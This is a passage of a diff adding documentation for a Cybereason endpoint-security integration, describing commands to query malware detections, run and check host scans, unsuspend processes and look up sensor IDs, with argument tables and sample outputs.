+```!cybereason-unsuspend-process machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Unsuspend Process"```
+#### Human Readable Output
+
+>Unsuspend process remediation action status is: SUCCESS
+>Remediation ID: 1ad1bce3-ee77-4fae-ac59-37865dc4a9f4
+
+### cybereason-malware-query
+***
+Malware query with options and values to filter
+
+
+#### Base Command
+
+`cybereason-malware-query`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| needsAttention | Filter for Fetching Malwares by Malware needsAttention. Possible values are: True, False. | Optional | 
+| type | Filter for Fetching Malwares by Malware Type. (Possible filter values for Type are "KnownMalware,UnknownMalware,FilelessMalware,ApplicationControlMalware,RansomwareMalware"). | Optional | 
+| status | Filter for Fetching Malwares by Malware Status. (Possible filter values for Status are "Done,Excluded,Detected,Prevented,Remediated,DeleteOnRestart,Quarantined"). | Optional | 
+| timestamp | Filter for Fetching Malwares by Timestamp. Enter the time (in epoch). | Optional | 
+| limit | Filter for Fetching Malwares by Malware Limit. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-malware-query limit=5 needsAttention=True status=Done type=KnownMalware timestamp=1582206286000```
+#### Human Readable Output
+
+>```
+>{
+>    "data": {
+>        "hasMoreResults": false,
+>        "malwares": [],
+>        "totalResults": 0
+>    },
+>    "expectedResults": 0,
+>    "failedServersInfo": null,
+>    "failures": 0,
+>    "hidePartialSuccess": false,
+>    "message": "",
+>    "status": "SUCCESS"
+>}
+>```
+
+### cybereason-start-host-scan
+***
+Start or stop a full or quick scan for a host.
+
+
+#### Base Command
+
+`cybereason-start-host-scan`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| sensorID | Sensor ID of a sensor. (Comma separated values supported.). | Required | 
+| scanType | Select a method/type to scan a host. Possible values are: FULL, QUICK, STOP. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-start-host-scan sensorID=5e77883de4b0575ddcf824ef:PYLUMCLIENT_INTEGRATION_DESKTOP-VG9KE2U_0800273ADC2F scanType=FULL```
+#### Human Readable Output
+
+>Batch ID: -1112786456
+
+### cybereason-fetch-scan-status
+***
+Get the results for host scanning.
+
+
+#### Base Command
+
+`cybereason-fetch-scan-status`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| batchID | The batch ID obtained after initiating the scan. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-fetch-scan-status batchID=-1112786456```
+#### Human Readable Output
+
+>```
+>{
+>    "abortHttpStatusCode": null,
+>    "abortTime": 0,
+>    "abortTimeout": false,
+>    "aborterUser": null,
+>    "actionArguments": [
+>        "com.cybereason.configuration.models.ScheduleScanAction",
+>        "FULL"
+>    ],
+>    "actionType": "SchedulerScan",
+>    "batchId": -1112786456,
+>    "creatorUser": "<user_name>",
+>    "finalState": true,
+>    "globalStats": {
+>        "stats": {
+>            "AbortTimeout": 0,
+>            "Aborted": 0,
+>            "Aborting": 0,
+>            "AlreadyUpdated": 0,
+>            "BadArgument": 0,
+>            "ChunksRequired": 0,
+>            "Disconnected": 0,
+>            "EndedWithInvalidParam": 0,
+>            "EndedWithNoValidFolder": 0,
+>            "EndedWithSensorTimeout": 0,
+>            "EndedWithTooManyResults": 0,
+>            "EndedWithTooManySearches": 0,
+>            "EndedWithUnknownError": 0,
+>            "EndedWithUnsupportedFilter": 0,
+>            "EndedWithYaraCompileError": 0,
+>            "Failed": 0,
+>            "FailedSending": 0,
+>            "FailedSendingToServer": 0,
+>            "GettingChunks": 0,
+>            "InProgress": 0,
+>            "InvalidState": 0,
+>            "MsiFileCorrupted": 0,
+>            "MsiSendFail": 0,
+>            "NewerInstalled": 0,
+>            "None": 0,
+>            "NotSupported": 0,
+>            "Pending": 0,
+>            "Primed": 0,
+>            "ProbeRemoved": 0,
+>            "SendingMsi": 0,
+>            "SendingPlatform": 0,
+>            "Started": 0,
+>            "Succeeded": 1,
+>            "Timeout": 0,
+>            "TimeoutSending": 0,
+>            "UnauthorizedUser": 0,
+>            "UnknownProbe": 0,
+>            "partialResponse": 0
+>        }
+>    },
+>    "initiatorUser": "<user_name>",
+>    "startTime": 1652279731232,
+>    "totalNumberOfProbes": 1
+>}
+>```
+
+### cybereason-get-sensor-id
+***
+Get the Sensor ID of a machine.
+
+
+#### Base Command
+
+`cybereason-get-sensor-id`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| machineName | The hostname of the machine. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-get-sensor-id machineName=desktop-vg9ke2u```
+#### Human Readable Output
+
+>Sensor ID for the machine 'desktop-vg9ke2u' is: 5e77883de4b0575ddcf824ef:PYLUMCLIENT_INTEGRATION_DESKTOP-VG9KE2U_0800273ADC2F
